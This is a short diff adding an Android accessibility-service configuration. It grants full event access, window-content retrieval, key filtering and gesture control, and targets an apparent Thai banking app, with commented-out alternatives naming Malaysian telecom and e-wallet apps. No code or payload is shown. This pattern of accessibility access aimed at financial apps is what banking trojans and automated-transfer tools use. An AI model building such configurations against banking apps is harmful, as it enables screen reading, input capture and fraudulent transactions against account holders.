@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeAllMask"
+    android:accessibilityFlags="flagDefault"
+    android:accessibilityFeedbackType="feedbackAllMask"
+    android:notificationTimeout="100"
+    android:canRetrieveWindowContent="true"
+    android:canRequestFilterKeyEvents="true"
+    android:canPerformGestures="true"
+    android:packageNames="com.kasikorn.retail.mbanking.wap"
+    android:settingsActivity="com.example.android.accessibility.ServiceSettingsActivity"
+    />
+
+<!--    android:packageNames="com.omesti.myumobile"-->
+<!--    android:packageNames="my.com.maxis.hotlink.production"-->
+<!--    android:packageNames="com.digi.portal.mobdev.android"-->
+<!--    android:packageNames="com.kasikorn.retail.mbanking.wap"-->
+<!--    android:packageNames="my.com.tngdigital.ewallet"-->
